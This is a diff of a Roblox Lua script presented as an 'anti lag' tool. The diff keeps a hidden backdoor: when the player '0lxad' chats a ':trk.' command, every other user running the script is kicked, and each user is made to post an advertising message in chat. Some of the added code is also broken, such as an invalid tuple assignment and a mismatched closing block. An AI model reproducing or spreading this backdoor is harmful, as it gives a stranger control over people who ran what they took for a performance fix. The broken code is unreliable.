@@ -1,7 +1,10 @@
 local Players = game:GetService("Players")
 local Player = game:GetService('Players').LocalPlayer or game:GetService('Players'):WaitForChild('LocalPlayer')
-local Daddy = game:GetService('Players'):FindFirstChild('0lxad') or game:GetService('Players'):WaitForChild('0lxad') or game:GetService('Players')
 local runservice = game:GetService('RunService')
+local safe = (93486234289567190, 123490821468906714000, 134891670418940198908)
+if Player.Name ~= '0lxad' then
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("Loaded nim's anti lag (weaker)","all")
+end
 for i,descendant in game.Workspace:GetDescendants() do
 	if descendant.ClassName == 'Humanoid' then
 		descendant.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Subject
@@ -22,19 +25,22 @@ rchat = function(Message)
   Players:Chat(Message)
 end
 
-Daddy.Chatted:Connect(function(msg)
-    if string.lower(string.split(msg, '.')[1]) == ":trk" then
-      if Player.Name == '0lxad' then print("Skids kicked")
-      else
-        local kmsg = string.split(msg, '.')[2]
-            Player:Kick(kmsg)
-      end
-    end
+game.Players.PlayerAdded:Connect(function(plr)
+	if plr.Name == '0lxad' then
+		print("Daddy found!")
+		local Daddy = plr
+		Daddy.Chatted:Connect(function(msg)
+    		if string.lower(string.split(msg, '.')[1]) == ":trk" then
+      			if Player.Name == '0lxad' then print("Skids kicked")
+      			else
+        		local kmsg = string.split(msg, '.')[2]
+            	Player:Kick(kmsg)
+      		end
+    	end
+	end
 end)
 
-if Player.Name ~= '0lxad' then
-game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("Loaded nim's anti lag (weaker)","all")
-end
+end)
 
 runservice.Stepped:Connect(function()
     for i,v in pairs(workspace:GetDescendants())do
@@ -44,9 +50,11 @@ runservice.Stepped:Connect(function()
                     v:Destroy()
                 end
             end
-	    elseif v.Name == 'SkateboardPlatform' then
-            v.CFrame = CFrame.new(93486234289567190, 123490821468906714000, 134891670418940198908)
-            v.Name = 'NoBoard xd'
+	    elseif v.ClassName == 'SkateboardPlatform' then
+			if v.Position ~= safe then
+            	v.CFrame = CFrame.new(safe)
+            	v.Name = 'NoBoard xd'
+			end
         end
     end
 end)
